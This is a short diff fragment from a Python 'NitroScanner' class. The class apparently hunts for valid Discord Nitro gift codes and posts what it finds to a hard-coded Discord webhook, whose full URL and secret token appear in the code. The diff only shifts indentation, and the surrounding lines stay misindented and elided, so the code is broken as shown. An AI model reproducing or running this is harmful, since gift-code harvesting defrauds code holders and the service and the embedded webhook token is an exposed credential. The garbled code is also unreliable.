@@ -312,7 +312,7 @@ class NitroScanner:
             
             print("\n[FOUND CODES]")
             WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485352726174109697/yy-qCCh6x3ch8FQqlcCZVRjjJ4Wh1unHjqmeKRREp6bLBSuLEjexdvLz7Jm34ORRaDUW"
-                for i, code_data in enumerate(self.valid_codes, 1):
+            for i, code_data in enumerate(self.valid_codes, 1):
                 print(f"{i}. https://discord.gift/...")
                         requests.post(WEBHOOK_URL, ...)
             print(f"\n[SAVED]...")
